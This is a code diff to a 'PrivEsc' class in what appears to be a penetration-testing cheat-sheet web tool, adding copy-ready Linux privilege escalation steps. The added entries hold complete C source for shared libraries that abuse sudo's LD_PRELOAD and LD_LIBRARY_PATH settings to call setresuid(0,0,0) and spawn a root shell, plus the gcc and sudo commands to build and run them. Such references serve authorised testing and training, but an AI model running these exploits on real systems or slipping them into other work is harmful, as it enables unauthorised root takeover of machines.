@@ -700,6 +700,29 @@ class PrivEsc extends MyTool {
       {'title': 'sudo (When su is not allowed)', 'cmd': 'sudo -s'},
       {'title': 'sudo (When su is not allowed)', 'cmd': 'sudo -i'},
       {'title': 'sudo (When su is not allowed)', 'cmd': 'sudo /bin/bash'},
+      {'title': '1. LD_PRELOAD', 'cmd': 'sudo -l', 'memo': 'env_reset, env_keep+=LD_PRELOAD, env_keep+=LD_LIBRARY_PATH'},
+      {'title': '2. Create a file (preload.c)', 'code': `#include &lt;stdio.h&gt;
+#include &lt;sys/types.h&gt;
+#include &lt;stdlib.h&gt;
+void _init() {
+    unsetenv("LD_PRELOAD");
+    setresuid(0,0,0);
+    system("/bin/bash -p");
+}`},
+      {'title': '3. Compile to preload.so', 'cmd': 'gcc -fPIC -shared -nostartfiles -o /tmp/preload.so preload.c'},
+      {'title': '4. Run any allowed program using sudo', 'cmd': 'sudo LD_PRELOAD=/tmp/preload.so apache2'},
+      {'title': '1. Run ldd against the apache2 program file', 'cmd': 'ldd /usr/sbin/apache2', 'memo': 'ex) libcrypt.so.1 => /lib/libcrypt.so.1'},
+      {'title': '2. Create a file (library_path.c)', 'code': `#include &lt;stdio.h&gt;
+#include &lt;stdlib.h&gt;
+static void hijack() __attribute__((constructor));
+void hijack() {
+    unsetenv("LD_LIBRARY_PATH");
+    setresuid(0,0,0);
+    system("/bin/bash -p");
+}`},
+      {'title': '3. Compile to libcrypt.so.1', 'cmd': 'gcc -o libcrypt.so.1 -shared -fPIC library_path.c'},
+      {'title': '4. Run apache2 using sudo with LD_LIBRARY_PATH to the current path', 'cmd': 'sudo LD_LIBRARY_PATH=. apache2'},
+      {'title': '', 'cmd': ''},
       {'title': '', 'cmd': ''},
     ];
   }
@@ -710,6 +733,9 @@ class PrivEsc extends MyTool {
       let title = content.title;
       let cmd = content.cmd;
       let memo = content.memo || "";
+      if (content.code) {
+        cmd = content.code;
+      }
       cmd = cmd.replace('{0}', `<span class="bg-warning">${htmlEscape(lhost)}</span>`);
       cmd = cmd.replace('{1}', `<span class="bg-warning">${htmlEscape(lport)}</span>`);
       // Template
@@ -717,7 +743,7 @@ class PrivEsc extends MyTool {
       <li class="list-group-item d-flex justify-content-between align-items-start copy_article">
         <div class="ms-2 me-auto" style="width: 80%">
           <div class="fw-bold">${title}</div>
-          <code class="copy_target">${cmd}</code>
+          <code class="copy_target">${content.code ? "<pre>" : ""}${cmd}${content.code ? "</pre>" : ""}</code>
           ${(memo === "") ? "": `<p class="ms-3 mt-2">${memo}</p>`}
         </div>
         <button type="button" class="btn btn-outline-primary copy_input" data-bs-toggle="tooltip" data-bs-placement="top" title="Copy to clipboard">Copy</button>
